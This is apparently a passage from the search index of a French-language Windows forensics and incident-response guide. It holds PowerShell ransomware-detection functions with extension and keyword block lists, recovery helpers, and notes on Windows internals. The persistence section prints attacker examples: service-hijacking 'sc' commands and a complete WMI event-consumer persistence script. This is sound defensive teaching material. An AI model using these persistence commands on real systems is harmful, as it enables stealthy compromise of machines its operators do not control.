{\n    param([string[]]$ScanPaths)\n\n    $ransomwareExtensions = @(\n        \".encrypt\", \".locked\", \".crypto\", \".crypt\", \".crinf\", \".r5a\", \".XRNT\",\n        \".XTBL\", \".crypt\", \".R16M01D05\", \".pzdc\", \".good\", \".LOL!\", \".OMG!\",\n        \".RDM\", \".RRK\", \".encryptedRSA\", \".crjoker\", \".EnCiPhErEd\", \".LeChiffre\",\n        \".keybtc@inbox_com\", \".0x0\", \".bleep\", \".1999\", \".vault\", \".HA3\",\n        \".toxcrypt\", \".magic\", \".SUPERCRYPT\", \".CTBL\", \".CTB2\", \".locky\",\n        \".zepto\", \".odin\", \".shit\", \".fuck\", \".petra\", \".purge\", \".dharma\",\n        \".wallet\", \".bitcrypt\", \".howDecrypt\", \".html\", \".cerber\", \".cerber2\",\n        \".cerber3\", \".encrypt\", \".R16M01D05\", \".gcman\", \".krab\", \".nozelesn\",\n        \".noproblemwedecfiles\", \".EnCiPhErEd\", \".encrypted\", \".FuckYourData\",\n        \".Whereisyourfiles\", \".encrypted\", \".ttt\", \".micro\", \".mp3\", \".encrypted\",\n        \".VforVendetta\", \".LockLock\", \".encrypted\", \".xolzsec\", \".antihacker2017\",\n        \".bitstak\", \".coinvault\", \".pzdc\"\n    )\n\n    $detectedFiles = @()\n\n    foreach ($path in $ScanPaths) {\n        $files = Get-ChildItem -Path $path -Recurse -ErrorAction SilentlyContinue\n\n        foreach ($file in $files) {\n            $extension = [System.IO.Path]::GetExtension($file.FullName).ToLower()\n\n            if ($extension -in $ransomwareExtensions) {\n                $detectedFiles += [PSCustomObject]@{\n                    FilePath = $file.FullName\n                    Extension = $extension\n                    LastWriteTime = $file.LastWriteTime\n                    Size = $file.Length\n                }\n            }\n        }\n    }\n\n    return $detectedFiles\n}\n</code></pre></p>"},{"location":"use-cases/#analyse-post-infection","title":"Analyse post-infection","text":""},{"location":"use-cases/#analyse-des-artefacts","title":"Analyse des artefacts","text":"<p>Analyse des notes de ran\u00e7on <pre><code>function Analyze-RansomNotes {\n    param([string[]]$SearchPaths)\n\n    $ransomNotePatterns = @(\n        \"*.txt\", \"*.html\", \"*.hta\", \"*.bmp\", \"*.jpg\", \"*.png\"\n    )\n\n    $ransomKeywords = @(\n        \"ransom\", \"bitcoin\", \"decrypt\", \"encrypted\", \"files\", \"payment\",\n        \"instruction\", \"recovery\", \"restore\", \"unlock\", \"key\", \"private\",\n        \"BTC\", \"cryptocurrency\", \"tor\", \"onion\", \"deadline\", \"timer\"\n    )\n\n    $detectedNotes = @()\n\n    foreach ($path in $SearchPaths) {\n        foreach ($pattern in $ransomNotePatterns) {\n            $files = Get-ChildItem -Path $path -Filter $pattern -Recurse -ErrorAction SilentlyContinue\n\n            foreach ($file in $files) {\n                try {\n                    $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue\n\n                    if ($content) {\n                        $matchedKeywords = $ransomKeywords | Where-Object { $content -match $_ }\n\n                        if ($matchedKeywords.Count -ge 3) {\n                            $detectedNotes += [PSCustomObject]@{\n                                FilePath = $file.FullName\n                                FileName = $file.Name\n                                Size = $file.Length\n                                CreationTime = $file.CreationTime\n                                LastWriteTime = $file.LastWriteTime\n                                MatchedKeywords = $matchedKeywords\n                                Content = $content\n                            }\n                        }\n                    }\n                } catch {\n                    # Ignorer les erreurs de lecture\n                }\n            }\n        }\n    }\n\n    return $detectedNotes\n}\n</code></pre></p> <p>Analyse des processus de chiffrement <pre><code># Analyser les processus suspects li\u00e9s au chiffrement\nfunction Analyze-EncryptionProcesses {\n    param([string]$LogPath)\n\n    $encryptionIndicators = @(\n        \"CryptEncrypt\", \"CryptDecrypt\", \"CryptCreateHash\", \"CryptHashData\",\n        \"BCryptEncrypt\", \"BCryptDecrypt\", \"BCryptCreateHash\",\n        \"AES\", \"RSA\", \"DES\", \"3DES\", \"Blowfish\", \"Twofish\",\n        \"OpenSSL\", \"CryptoAPI\", \"cryptbase.dll\", \"bcrypt.dll\"\n    )\n\n    # Analyser les \u00e9v\u00e9nements Sysmon de cr\u00e9ation de processus\n    $suspiciousProcesses = Get-WinEvent -FilterHashtable @{\n        LogName=\"Microsoft-Windows-Sysmon/Operational\"\n        Id=1\n    } | ForEach-Object {\n        $event = [xml]$_.ToXml()\n        $eventData = $event.Event.EventData.Data\n\n        $processName = ($eventData | Where-Object {$_.Name -eq \"Image\"}).'#text'\n        $commandLine = ($eventData | Where-Object {$_.Name -eq \"CommandLine\"}).'#text'\n        $parentProcess = ($eventData | Where-Object {$_.Name -eq \"ParentImage\"}).'#text'\n\n        $matchedIndicators = $encryptionIndicators | Where-Object {\n            $commandLine -match $_ -or $processName -match $_\n        }\n\n        if ($matchedIndicators) {\n            [PSCustomObject]@{\n                TimeCreated = $_.TimeCreated\n                ProcessName = $processName\n                CommandLine = $commandLine\n                ParentProcess = $parentProcess\n                MatchedIndicators = $matchedIndicators\n            }\n        }\n    }\n\n    return $suspiciousProcesses\n}\n</code></pre></p>"},{"location":"use-cases/#recuperation-de-donnees","title":"R\u00e9cup\u00e9ration de donn\u00e9es","text":""},{"location":"use-cases/#techniques-de-recuperation","title":"Techniques de r\u00e9cup\u00e9ration","text":"<p>Volume Shadow Copies <pre><code># V\u00e9rifier et r\u00e9cup\u00e9rer depuis les Volume Shadow Copies\nfunction Recover-FromShadowCopies {\n    param([string]$TargetPath)\n\n    # Lister les shadow copies disponibles\n    $shadowCopies = Get-WmiObject -Class Win32_ShadowCopy\n\n    if ($shadowCopies.Count -eq 0) {\n        Write-Warning \"No shadow copies found\"\n        return\n    }\n\n    Write-Host \"Available shadow copies:\"\n    $shadowCopies | ForEach-Object {\n        Write-Host \"  ID: $($_.ID)\"\n        Write-Host \"  InstallDate: $($_.InstallDate)\"\n        Write-Host \"  VolumeName: $($_.VolumeName)\"\n        Write-Host \"---\"\n    }\n\n    # Cr\u00e9er un lien symbolique vers la shadow copy la plus r\u00e9cente\n    $latestShadow = $shadowCopies | Sort-Object InstallDate -Descending | Select-Object -First 1\n\n    if ($latestShadow) {\n        $shadowPath = $latestShadow.DeviceObject + \"\\\"\n        $linkPath = \"C:\\ShadowRecovery\"\n\n        # Cr\u00e9er le lien symbolique\n        cmd /c \"mklink /d $linkPath $shadowPath\"\n\n        Write-Host \"Shadow copy linked to: $linkPath\"\n        Write-Host \"You can now access files from: $linkPath$TargetPath\"\n    }\n}\n</code></pre></p> <p>R\u00e9cup\u00e9ration de fichiers supprim\u00e9s <pre><code># Utiliser des outils de r\u00e9cup\u00e9ration de fichiers\nfunction Recover-DeletedFiles {\n    param(\n        [string]$DriveLetter,\n        [string]$OutputPath\n    )\n\n    # Utiliser PhotoRec pour r\u00e9cup\u00e9rer les fichiers\n    $photorecPath = \"C:\\Tools\\photorec.exe\"\n\n    if (Test-Path $photorecPath) {\n        $photorecArgs = @(\n            \"/d\", $OutputPath,\n            \"/cmd\", $DriveLetter,\n            \"fileopt,everything,enable\",\n            \"search\"\n        )\n\n        Start-Process -FilePath $photorecPath -ArgumentList $photorecArgs -Wait\n\n        Write-Host \"File recovery completed. Check: $OutputPath\"\n    } else {\n        Write-Warning \"PhotoRec not found at: $photorecPath\"\n    }\n}\n</code></pre></p>"},{"location":"use-cases/#prevention-et-mitigation","title":"Pr\u00e9vention et mitigation","text":""},{"location":"use-cases/#mesures-preventives","title":"Mesures pr\u00e9ventives","text":"<p>Monitoring en temps r\u00e9el <pre><code># Syst\u00e8me de monitoring en temps r\u00e9el\nfunction Start-RansomwareMonitoring {\n    param([string[]]$ProtectedPaths)\n\n    # Cr\u00e9er un job en arri\u00e8re-plan\n    $job = Start-Job -ScriptBlock {\n        param($paths)\n\n        # Importer les fonctions n\u00e9cessaires\n        function Monitor-FileEncryption {\n            # (Code de la fonction pr\u00e9c\u00e9dente)\n        }\n\n        function Detect-RansomwareExtensions {\n            # (Code de la fonction pr\u00e9c\u00e9dente)\n        }\n\n        # D\u00e9marrer le monitoring\n        $watchers = Monitor-FileEncryption -MonitoredPaths $paths\n\n        # Boucle de monitoring\n        while ($true) {\n            Start-Sleep -Seconds 60\n\n            # V\u00e9rifier les extensions suspectes\n            $suspiciousFiles = Detect-RansomwareExtensions -ScanPaths $paths\n\n            if ($suspiciousFiles.Count -gt 0) {\n                Write-Warning \"RANSOMWARE DETECTED: $($suspiciousFiles.Count) encrypted files found\"\n\n                # Actions d'urgence\n                # 1. Isoler le syst\u00e8me\n                # 2. Arr\u00eater les services critiques\n                # 3. Alerter les administrateurs\n\n                break\n            }\n        }\n\n        # Nettoyer les watchers\n        foreach ($watcher in $watchers) {\n            $watcher.Dispose()\n        }\n\n    } -ArgumentList $ProtectedPaths\n\n    return $job\n}\n</code></pre></p> <p>Cette approche compl\u00e8te permet d'analyser efficacement les diff\u00e9rents types de menaces et d'incidents dans un environnement Windows.</p>"},{"location":"windows-fundamentals/","title":"Windows Fundamentals for Digital Forensics","text":""},{"location":"windows-fundamentals/#architecture-windows-comprehension-du-systeme","title":"Architecture Windows - Compr\u00e9hension du syst\u00e8me","text":""},{"location":"windows-fundamentals/#structure-du-kernel-windows","title":"Structure du kernel Windows","text":"<p>Le noyau Windows est organis\u00e9 en plusieurs couches qui g\u00e8rent les ressources syst\u00e8me et fournissent une interface entre les applications et le mat\u00e9riel.</p>"},{"location":"windows-fundamentals/#composants-principaux-du-kernel","title":"Composants principaux du kernel","text":"<p>Executive Layer - Object Manager : G\u00e8re tous les objets syst\u00e8me (processus, threads, fichiers, etc.) - Memory Manager : Gestion de la m\u00e9moire virtuelle et physique - Process Manager : Cr\u00e9ation et gestion des processus et threads - I/O Manager : Gestion des entr\u00e9es/sorties et du syst\u00e8me de fichiers - Security Reference Monitor : Contr\u00f4le d'acc\u00e8s et audit de s\u00e9curit\u00e9</p> <p>HAL (Hardware Abstraction Layer) - Interface entre le kernel et le mat\u00e9riel - Abstraction des sp\u00e9cificit\u00e9s mat\u00e9rielles - Gestion des interruptions et de l'acc\u00e8s aux p\u00e9riph\u00e9riques</p> <p>Kernel Layer - Ordonnancement des threads (dispatcher) - Gestion des interruptions et exceptions - Synchronisation des objets kernel</p>"},{"location":"windows-fundamentals/#gestion-des-processus-et-threads","title":"Gestion des processus et threads","text":""},{"location":"windows-fundamentals/#structure-des-processus","title":"Structure des processus","text":"<p>Process Block (EPROCESS) <pre><code>- Process ID (PID)\n- Parent Process ID (PPID)\n- Token de s\u00e9curit\u00e9\n- Espace d'adressage virtuel\n- Liste des threads\n- Handles ouverts\n- Informations de session\n</code></pre></p> <p>Thread Block (ETHREAD) <pre><code>- Thread ID (TID)\n- \u00c9tat du thread (Running, Ready, Waiting)\n- Priorit\u00e9 et scheduling\n- Contexte CPU\n- Stack kernel et user\n</code></pre></p>"},{"location":"windows-fundamentals/#cycle-de-vie-des-processus","title":"Cycle de vie des processus","text":"<ol> <li>Cr\u00e9ation : <code>CreateProcess()</code> \u2192 <code>NtCreateProcess()</code></li> <li>Initialisation : Chargement de l'ex\u00e9cutable et des DLLs</li> <li>Ex\u00e9cution : Ordonnancement des threads</li> <li>Terminaison : Lib\u00e9ration des ressources</li> </ol>"},{"location":"windows-fundamentals/#artefacts-forensiques","title":"Artefacts forensiques","text":"<p>Processus cach\u00e9s - Techniques de d\u00e9tection (VAD traversal) - Analyse des structures EPROCESS - Comparaison avec la liste des processus visible</p> <p>Injection de code - DLL injection - Process hollowing - Reflective DLL loading</p>"},{"location":"windows-fundamentals/#modele-de-securite-windows","title":"Mod\u00e8le de s\u00e9curit\u00e9 Windows","text":""},{"location":"windows-fundamentals/#tokens-de-securite","title":"Tokens de s\u00e9curit\u00e9","text":"<p>Structure du token <pre><code>- User SID\n- Group SIDs\n- Privileges\n- Logon Session ID\n- Token Type (Primary/Impersonation)\n- Integrity Level\n</code></pre></p> <p>Types de tokens - Primary Token : Attach\u00e9 au processus - Impersonation Token : Temporaire pour un thread</p>"},{"location":"windows-fundamentals/#controle-dacces","title":"Contr\u00f4le d'acc\u00e8s","text":"<p>Security Descriptors - Owner : Propri\u00e9taire de l'objet - DACL (Discretionary Access Control List) - SACL (System Access Control List)</p> <p>Access Control Entries (ACE) <pre><code>- Type (Allow/Deny)\n- Inheritance flags\n- Access mask\n- Security Identifier (SID)\n</code></pre></p>"},{"location":"windows-fundamentals/#audit-et-logging","title":"Audit et logging","text":"<p>Event Logs - Security Log : Authentification, acc\u00e8s aux objets - System Log : \u00c9v\u00e9nements syst\u00e8me - Application Log : Applications tierces</p> <p>Audit Policy - Object Access - Logon Events - Account Management - Policy Changes</p>"},{"location":"windows-fundamentals/#services-et-demons-systeme","title":"Services et d\u00e9mons syst\u00e8me","text":""},{"location":"windows-fundamentals/#architecture-des-services","title":"Architecture des services","text":"<p>Service Control Manager (SCM) - Base de donn\u00e9es des services - D\u00e9marrage et arr\u00eat des services - Gestion des d\u00e9pendances</p> <p>Service Types - Win32 Service : Service standard - Kernel Driver : Pilote en mode kernel - File System Driver : Pilote syst\u00e8me de fichiers</p>"},{"location":"windows-fundamentals/#persistance-via-les-services","title":"Persistance via les services","text":"<p>M\u00e9thodes d'installation <pre><code># Cr\u00e9ation d'un service\nsc create malware binPath= \"C:\\malware.exe\" start= auto\n\n# Modification d'un service existant\nsc config Spooler binPath= \"C:\\malware.exe\"\n</code></pre></p> <p>D\u00e9tection forensique - Analyse du registre <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code> - V\u00e9rification des binaires de services - Corr\u00e9lation avec les logs d'\u00e9v\u00e9nements</p>"},{"location":"windows-fundamentals/#internals-windows-pour-dfir-concepts-avances","title":"Internals Windows pour DFIR - Concepts avanc\u00e9s","text":""},{"location":"windows-fundamentals/#object-manager-et-handle-table","title":"Object Manager et Handle Table","text":""},{"location":"windows-fundamentals/#architecture-des-objets","title":"Architecture des objets","text":"<p>Object Types <pre><code>- Process\n- Thread\n- File\n- Registry Key\n- Token\n- Event\n- Mutex\n- Semaphore\n</code></pre></p> <p>Object Header <pre><code>- Object Type\n- Reference Count\n- Handle Count\n- Name\n- Security Descriptor\n</code></pre></p>"},{"location":"windows-fundamentals/#handle-table","title":"Handle Table","text":"<p>Structure - Table par processus - Index vers Object Pointer - Access Rights - Inherit Flag</p> <p>Analyse forensique <pre><code># Pseudo-code pour l'analyse des handles\nfor process in processes:\n    for handle in process.handles:\n        object_type = handle.object.type\n        object_name = handle.object.name\n        access_rights = handle.access_rights\n</code></pre></p>"},{"location":"windows-fundamentals/#windows-api-et-syscalls","title":"Windows API et syscalls","text":""},{"location":"windows-fundamentals/#transition-user-mode-kernel-mode","title":"Transition User Mode \u2192 Kernel Mode","text":"<p>S\u00e9quence d'appel 1. Application \u2192 Win32 API (kernel32.dll) 2. Win32 API \u2192 Native API (ntdll.dll) 3. Native API \u2192 System Call (syscall) 4. Kernel \u2192 Executive Functions</p> <p>Hooking et d\u00e9tection - User-mode hooks : IAT/EAT hooking - Kernel-mode hooks : SSDT hooking - Techniques de d\u00e9tection : V\u00e9rification d'int\u00e9grit\u00e9 des tables</p>"},{"location":"windows-fundamentals/#syscalls-importants-pour-dfir","title":"Syscalls importants pour DFIR","text":"<p>Gestion des fichiers - <code>NtCreateFile</code> - <code>NtReadFile</code> - <code>NtWriteFile</code> - <code>NtDeleteFile</code></p> <p>Gestion des processus - <code>NtCreateProcess</code> - <code>NtTerminateProcess</code> - <code>NtReadVirtualMemory</code> - <code>NtWriteVirtualMemory</code></p> <p>Gestion du registre - <code>NtCreateKey</code> - <code>NtSetValueKey</code> - <code>NtQueryValueKey</code> - <code>NtDeleteKey</code></p>"},{"location":"windows-fundamentals/#gestion-des-dlls-et-modules","title":"Gestion des DLLs et modules","text":""},{"location":"windows-fundamentals/#chargement-des-dlls","title":"Chargement des DLLs","text":"<p>Process Environment Block (PEB) <pre><code>- Image Base Address\n- Ldr (Loader Data)\n- Process Parameters\n- Module List\n</code></pre></p> <p>Loader Data - InLoadOrderModuleList - InMemoryOrderModuleList - InInitializationOrderModuleList</p>"},{"location":"windows-fundamentals/#techniques-de-persistance","title":"Techniques de persistance","text":"<p>DLL Hijacking - Search Order Hijacking - Phantom DLL Hijacking - DLL Side-loading</p> <p>D\u00e9tection forensique <pre><code># V\u00e9rification des DLLs charg\u00e9es\nfor module in process.modules:\n    if module.path not in trusted_paths:\n        check_digital_signature(module.path)\n        analyze_module_imports(module)\n</code></pre></p>"},{"location":"windows-fundamentals/#mecanismes-de-persistence","title":"M\u00e9canismes de persistence","text":""},{"location":"windows-fundamentals/#registre-windows","title":"Registre Windows","text":"<p>Cl\u00e9s de d\u00e9marrage automatique <pre><code>HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nHKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices\n</code></pre></p> <p>Services <pre><code>HKLM\\SYSTEM\\CurrentControlSet\\Services\n</code></pre></p> <p>Winlogon <pre><code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\n- Shell\n- Userinit\n- Notify\n</code></pre></p>"},{"location":"windows-fundamentals/#scheduled-tasks","title":"Scheduled Tasks","text":"<p>Stockage <pre><code>%SystemRoot%\\System32\\Tasks\n%SystemRoot%\\Tasks (Windows XP/2003)\n</code></pre></p> <p>Analyse forensique - Parsing des fichiers de t\u00e2ches - Corr\u00e9lation avec les logs d'\u00e9v\u00e9nements - V\u00e9rification des triggers et actions</p>"},{"location":"windows-fundamentals/#wmi-windows-management-instrumentation","title":"WMI (Windows Management Instrumentation)","text":"<p>Persistance via WMI <pre><code># Event Consumer\n$consumer = Set-WmiInstance -Namespace \"root\\subscription\" -Class \"CommandLineEventConsumer\" -Arguments @{\n    Name = \"MalwareConsumer\"\n    CommandLineTemplate = \"C:\\malware.exe\"\n}\n\n# Event Filter\n$filter = Set-WmiInstance -Namespace \"root\\subscription\" -Class \"__EventFilter\" -Arguments @{\n    Name = \"MalwareFilter\"\n    EventNamespace = \"root\\cimv2\"\n    QueryLanguage = \"WQL\"\n    Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'\"\n}\n\n# Binding\nSet-WmiInstance -Namespace \"root\\subscription\" -Class \"__FilterToConsumerBinding\" -Arguments @{\n    Filter = $filter\n    Consumer = $consumer\n}\n</code></pre></p> <p>D\u00e9tection - \u00c9num\u00e9ration des Event Consumers - Analyse des requ\u00eates WQL suspectes - V\u00e9rification des bindings</p>"},{"location":"windows-fundamentals/#points-cles-pour-lanalyse-forensique","title":"Points cl\u00e9s pour l'analyse forensique","text":""},{"location":"windows-fundamentals/#artefacts-essentiels","title":"Artefacts essentiels","text":"<ol> <li>M\u00e9moire syst\u00e8me</li> <li>Structures EPROCESS/ETHREAD</li> <li>VAD (Virtual Address Descriptors)</li> <li>Handle Tables</li> <li> <p>Object Manager</p> </li> <li> <p>Registre Windows</p> </li> <li>Cl\u00e9s de persistance</li> <li>Configuration des services</li> <li> <p>Historique des activit\u00e9s</p> </li> <li> <p>Logs syst\u00e8me</p> </li> <li>Event Logs</li> <li>ETW traces</li> <li>Audit logs</li> </ol>"},{"location":"windows-fundamentals/#outils-recommandes","title":"Outils recommand\u00e9s","text":"<ul> <li>Volatility : Analyse m\u00e9moire</li> <li>Registry Explorer : Analyse du registre</li> <li>Process Monitor : Monitoring temps r\u00e9el</li> <li>Autoruns : D\u00e9tection de persistance</li> <li>WinAPIOverride : Monitoring des API calls</li> </ul> <p>Cette compr\u00e9hension des fondamentaux Windows est essentielle pour toute analyse forensique efficace sur les syst\u00e8mes Windows.</p>"}]}